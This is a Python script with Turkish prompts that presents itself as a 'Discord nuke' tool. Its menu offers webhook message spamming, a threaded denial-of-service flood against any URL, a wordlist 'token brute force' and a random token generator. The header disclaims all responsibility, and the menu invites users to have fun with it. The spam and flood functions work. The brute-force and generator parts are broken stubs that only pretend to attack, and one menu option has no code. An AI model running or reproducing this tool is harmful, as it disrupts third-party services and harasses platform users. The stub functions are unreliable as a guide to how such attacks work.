license = """ BU PROGRAM ROE TARAFINDAN YAPILMIŞTIR HİÇ BİR SORUMLUK KABUL ETMİYORUZ 2023"""

import time 
import os
import colorama
import requests 
import threading

def send_webhook_message(url, content, username):
    from discord_webhook import DiscordWebhook
    webhook = DiscordWebhook(url=url, content=content, username=username)
    response = webhook.execute()
    return response

def dos_target(url, num_requests):
    for _ in range(num_requests):
        requests.get(url)

def generate_random_token(length):
    import random
    import string
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def main():
    print(license)
    time.sleep(5)
    os.system("apt-get install figlet")
    os.system("pip install discord-webhook")
    os.system("clear")
    os.system(colorama.Fore.GREEN + "figlet ROENUKE")

    print(colorama.Fore.YELLOW + """
               DİSCORD NUKEYE HOŞGELDİN DOST SEÇ VE EĞLEN :)
      
     1) Webhook Spammer
     2) Webhook Checker
     3) DoS
     4) Token Brute Force 
     5) Token Generator 
     6) User İnfo    
      
      """)

    secim = input("Lütfen Seçin : ")

    if secim == "1":
        while True:
            try:
                webhook_url = input("Webhook URL'sini girin: ")
                message_content = input("Gönderilecek mesajı girin: ")
                username = input("Kullanıcı adını girin: ")

                response = send_webhook_message(webhook_url, message_content, username)

                if response.status_code == 204:
                    print("Mesaj başarıyla gönderildi.")
                else:
                    print(f"Mesaj gönderilirken hata oluştu: {response.text}")

                more_messages = input("Başka bir mesaj göndermek istiyor musunuz? (E/H): ")
                if more_messages.lower() != "e":
                    break
            except Exception as e:
                print(f"Hata oluştu: {e}")

    elif secim == "3":
        colorama.init(autoreset=True)

        print(colorama.Fore.YELLOW + "Discord Nukeye DoS Aracına Hoş Geldiniz!\n")
        
        target_url = input("Hedef URL'yi girin: ")
        num_requests = int(input("Kaç istek göndermek istersiniz? "))
        
        print("\nDoS saldırısı başlatılıyor...")
        for _ in range(num_requests):
            threading.Thread(target=dos_target, args=(target_url, 1)).start()
        
        print(colorama.Fore.GREEN + "DoS saldırısı başarıyla tamamlandı.")
        input("Ana menüye dönmek için Enter tuşuna basın...")
        main()

    elif secim == "4":
        colorama.init(autoreset=True)

        print(colorama.Fore.YELLOW + "Token Brute Force Aracına Hoş Geldiniz!\n")
        
        target_id = input("Hedef kullanıcının ID'sini girin: ")
        wordlist_path = input("Wordlist dosyasının yolunu girin: ")

        with open(wordlist_path, "r") as file:
            passwords = file.readlines()
        
        print("\nBrute force saldırısı başlatılıyor...")
        for password in passwords:
            password = password.strip()
            token = f"{target_id}.{password}"

            # Burada token'i kullanarak giriş yapma işlemini simüle edebilirsiniz.
            # Eğer token doğru ise giriş başarılıdır

        print(colorama.Fore.GREEN + "Brute force saldırısı tamamlandı.")
        input("Ana menüye dönmek için Enter tuşuna basın...")
        main()

    elif secim == "5":
        try:
            num_tokens = int(input("Kaç adet rastgele token üretmek istersiniz? "))
            token_length = int(input("Her bir token uzunluğu kaç karakter olmalı? "))
            
            for _ in range(num_tokens):
                random_token = generate_random_token(token_length)
                print(random_token)
            
        except ValueError:
            print("Geçersiz sayı girdiniz!")

        input("Ana menüye dönmek için Enter tuşuna basın...")
        main()
    elif secim == "6":
        print("Kullanıcı Bilgileri:")
        adi = input("Adınızı girin: ")
        etiket = input("Etiketinizi girin: ")
        sahip_oldugu_sunucular = input("Sahip olduğunuz sunucuları virgülle ayırarak girin: ")
        email = input("E-posta adresinizi girin (isteğe bağlı): ")

        print("\nKullanıcı Bilgileri:")
        print("Adı:", adi)
        print("Etiketi:", etiket)
        print("Sahip Olduğu Sunucular:", sahip_oldugu_sunucular)
        if email:
            print("E-posta:", email)

        input("\nAna menüye dönmek için Enter tuşuna basın...")
        main()

if __name__ == "__main__":
    main()
